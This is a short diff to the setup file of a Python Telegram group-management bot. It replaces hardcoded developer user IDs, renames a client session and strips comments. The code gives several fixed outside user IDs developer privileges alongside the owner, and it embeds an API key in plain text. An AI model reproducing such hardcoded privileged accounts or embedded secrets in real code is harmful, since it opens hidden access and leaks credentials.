@@ -188,8 +188,9 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1781945165)
-DEV_USERS.add(1669178360)
+DEV_USERS.add(1960403979)
+DEV_USERS.add(2054013322)
+DEV_USERS.add(1204659519)
 
 if not SPAMWATCH_API:
     sw = None
@@ -210,9 +211,9 @@ pgram = Client(
     api_hash=API_HASH,
     bot_token=TOKEN,
 )
-telethn = TelegramClient("zaid", API_ID, API_HASH)
+telethn = TelegramClient("snehabhi", API_ID, API_HASH)
 aiohttpsession = ClientSession()
-# ARQ Client
+
 print("[INFO]: INITIALIZING ARQ CLIENT")
 arq = ARQ("https://thearq.tech", "YIECCC-NAJARO-OLLREW-SJSRIP-ARQ", aiohttpsession)
 pbot = Client("robot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
@@ -224,14 +225,14 @@ WOLVES = list(WOLVES)
 DEMONS = list(DEMONS)
 TIGERS = list(TIGERS)
 
-# Load at end to ensure all prev variables have been set
+
 from TGNRobot.modules.helper_funcs.handlers import (
     CustomCommandHandler,
     CustomMessageHandler,
     CustomRegexHandler,
 )
 
-# make sure the regex handler can take extra kwargs
+
 tg.RegexHandler = CustomRegexHandler
 tg.CommandHandler = CustomCommandHandler
 tg.MessageHandler = CustomMessageHandler
